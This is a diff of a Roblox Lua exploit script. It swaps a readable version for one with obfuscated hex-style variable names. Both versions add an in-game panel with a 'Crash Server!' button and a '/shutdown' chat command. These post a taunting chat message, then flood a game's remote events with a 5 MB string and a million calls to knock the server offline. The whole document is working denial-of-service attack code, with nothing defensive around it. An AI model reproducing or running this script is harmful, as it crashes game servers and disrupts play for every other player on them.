@@ -1,104 +1,80 @@
-local art = [[meow]]
-
-print("|" .. (art:gsub("\n", "\n|")))
-local RS          = game:GetService("ReplicatedStorage")
-local Players     = game:GetService("Players")
-local TextChatSvc = game:GetService("TextChatService")
-
-local lp          = Players.LocalPlayer
-local lpGui       = lp:WaitForChild("PlayerGui")
-
-local UpdTextures = RS.DataEvents.UpdateTexturesChoice
-local DataRemote  = RS.DataEvents.DataRemoteEvent
-
-local PAYLOAD     = string.rep("A", 5e6)
-
-local function sendChatMsg()
-    local ok = pcall(function()
-        local channel = TextChatSvc:FindFirstChild("TextChannels")
-            and TextChatSvc.TextChannels:FindFirstChild("RBXGeneral")
-        if channel then
-            channel:SendAsync("Shutting down server ^w^ - fembco")
-        end
-    end)
-
-    if not ok then
-        local sayRemote = RS:FindFirstChild("DefaultChatSystemChatEvents")
-            and RS.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
-        if sayRemote then
-            sayRemote:FireServer("Shutting down server ^w^ - fembco", "All")
-        end
-    end
+local _0xD797 =[[meow]]print("|".. (_0xD797:gsub("\n","\n|")))
+local _0xDF14 = game:GetService("ReplicatedStorage")
+local _0x23F0 = game:GetService("Players")
+local _0xD532 = game:GetService("TextChatService")
+local _0xB4E6 = _0x23F0.LocalPlayer
+local _0x8D9B = _0xB4E6:WaitForChild("PlayerGui")
+local _0x83D4 = _0xDF14.DataEvents.UpdateTexturesChoice
+local _0x8C7D = _0xDF14.DataEvents.DataRemoteEvent
+local _0x9977 = string.rep("A", 5e6)
+local function _0x2B8D()
+local _0x7F8D = pcall(function()
+local _0xC6D6 = _0xD532:FindFirstChild("TextChannels")
+and _0xD532.TextChannels:FindFirstChild("RBXGeneral")
+if _0xC6D6 then
+_0xC6D6:SendAsync("Shutting down server ^w^ - fembco")
 end
-
-local function flood()
-    sendChatMsg()
-
-    for _ = 1, 3 do
-        UpdTextures:FireServer(PAYLOAD)
-    end
-
-    for _ = 1, 1e6 do
-        DataRemote:FireServer()
-    end
+end)
+if not _0x7F8D then
+local _0xEDD9 = _0xDF14:FindFirstChild("DefaultChatSystemChatEvents")
+and _0xDF14.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+if _0xEDD9 then
+_0xEDD9:FireServer("Shutting down server ^w^ - fembco","All")
 end
-
-local sg = Instance.new("ScreenGui")
-sg.Name             = "CrashGui"
-sg.ResetOnSpawn     = false
-sg.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
-sg.Parent           = lpGui
-
-local frame = Instance.new("Frame")
-frame.Name              = "Panel"
-frame.Size              = UDim2.new(0, 160, 0, 60)
-frame.Position          = UDim2.new(0, 20, 0.5, -30)
-frame.BackgroundColor3  = Color3.fromRGB(18, 18, 18)
-frame.BorderSizePixel   = 0
-frame.Active            = true
-frame.Draggable         = true
-frame.Parent            = sg
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent       = frame
-
-local stroke = Instance.new("UIStroke")
-stroke.Color        = Color3.fromRGB(200, 40, 40)
-stroke.Thickness    = 1.5
-stroke.Parent       = frame
-
-local title = Instance.new("TextLabel")
-title.Size              = UDim2.new(1, 0, 0, 20)
-title.Position          = UDim2.new(0, 0, 0, 4)
-title.BackgroundTransparency = 1
-title.Text              = "meow"
-title.TextColor3        = Color3.fromRGB(200, 40, 40)
-title.Font              = Enum.Font.GothamBold
-title.TextSize          = 12
-title.Parent            = frame
-
-local btn = Instance.new("TextButton")
-btn.Name                = "CrashBtn"
-btn.Size                = UDim2.new(1, -20, 0, 28)
-btn.Position            = UDim2.new(0, 10, 0, 26)
-btn.BackgroundColor3    = Color3.fromRGB(200, 40, 40)
-btn.BorderSizePixel     = 0
-btn.Text                = "Crash Server!"
-btn.TextColor3          = Color3.fromRGB(255, 255, 255)
-btn.Font                = Enum.Font.GothamBold
-btn.TextSize            = 13
-btn.AutoButtonColor     = true
-btn.Parent              = frame
-
-local btnCorner = Instance.new("UICorner")
-btnCorner.CornerRadius = UDim.new(0, 6)
-btnCorner.Parent       = btn
-
-btn.MouseButton1Click:Connect(flood)
-
-lp.Chatted:Connect(function(msg)
-    if msg:lower() == "/shutdown" then
-        flood()
-    end
+end
+end
+local function _0x0FA7()
+_0x2B8D()
+for _ = 1, 3 do
+_0x83D4:FireServer(_0x9977)
+end
+for _ = 1, 1e6 do
+_0x8C7D:FireServer()
+end
+end
+local _0xC1DF = Instance.new("ScreenGui")
+_0xC1DF.Name ="CrashGui"_0xC1DF.ResetOnSpawn = false
+_0xC1DF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+_0xC1DF.Parent = _0x8D9B
+local _0x3EEC = Instance.new("Frame")
+_0x3EEC.Name ="Panel"_0x3EEC.Size = UDim2.new(0, 160, 0, 60)
+_0x3EEC.Position = UDim2.new(0, 20, 0.5, -30)
+_0x3EEC.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+_0x3EEC.BorderSizePixel = 0
+_0x3EEC.Active = true
+_0x3EEC.Draggable = true
+_0x3EEC.Parent = _0xC1DF
+local _0x053B = Instance.new("UICorner")
+_0x053B.CornerRadius = UDim.new(0, 8)
+_0x053B.Parent = _0x3EEC
+local _0x8520 = Instance.new("UIStroke")
+_0x8520.Color = Color3.fromRGB(200, 40, 40)
+_0x8520.Thickness = 1.5
+_0x8520.Parent = _0x3EEC
+local _0xC912 = Instance.new("TextLabel")
+_0xC912.Size = UDim2.new(1, 0, 0, 20)
+_0xC912.Position = UDim2.new(0, 0, 0, 4)
+_0xC912.BackgroundTransparency = 1
+_0xC912.Text ="meow"_0xC912.TextColor3 = Color3.fromRGB(200, 40, 40)
+_0xC912.Font = Enum.Font.GothamBold
+_0xC912.TextSize = 12
+_0xC912.Parent = _0x3EEC
+local _0xA266 = Instance.new("TextButton")
+_0xA266.Name ="CrashBtn"_0xA266.Size = UDim2.new(1, -20, 0, 28)
+_0xA266.Position = UDim2.new(0, 10, 0, 26)
+_0xA266.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+_0xA266.BorderSizePixel = 0
+_0xA266.Text ="Crash Server!"_0xA266.TextColor3 = Color3.fromRGB(255, 255, 255)
+_0xA266.Font = Enum.Font.GothamBold
+_0xA266.TextSize = 13
+_0xA266.AutoButtonColor = true
+_0xA266.Parent = _0x3EEC
+local _0x5487 = Instance.new("UICorner")
+_0x5487.CornerRadius = UDim.new(0, 6)
+_0x5487.Parent = _0xA266
+_0xA266.MouseButton1Click:Connect(_0x0FA7)
+_0xB4E6.Chatted:Connect(function(msg)
+if msg:lower() =="/shutdown"then
+_0x0FA7()
+end
 end)
